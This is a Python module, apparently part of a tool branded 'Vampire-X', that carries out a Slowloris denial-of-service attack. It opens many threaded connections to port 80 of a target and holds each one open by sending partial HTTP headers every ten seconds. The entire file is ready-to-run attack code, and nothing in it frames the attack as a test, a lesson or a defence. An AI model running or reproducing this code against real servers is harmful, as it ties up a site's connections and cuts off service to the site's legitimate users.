# slowloris.py

import socket
import threading
import random
import time

def attack(target, threads):
    print(f"\n[Slowloris] Vampire-X Slowloris Attack started on {target} with {threads} threads\n")

    def slowloris():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, 80))
            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
            while True:
                try:
                    header = f"X-a: {random.randint(1, 5000)}\r\n"
                    s.send(header.encode())
                    print(f"[Slowloris] Header sent to {target}")
                    time.sleep(10)
                except:
                    break
            s.close()
        except Exception as e:
            print(f"[Slowloris] Error: {str(e)}")

    for _ in range(threads):
        t = threading.Thread(target=slowloris)
        t.daemon = True
        t.start()
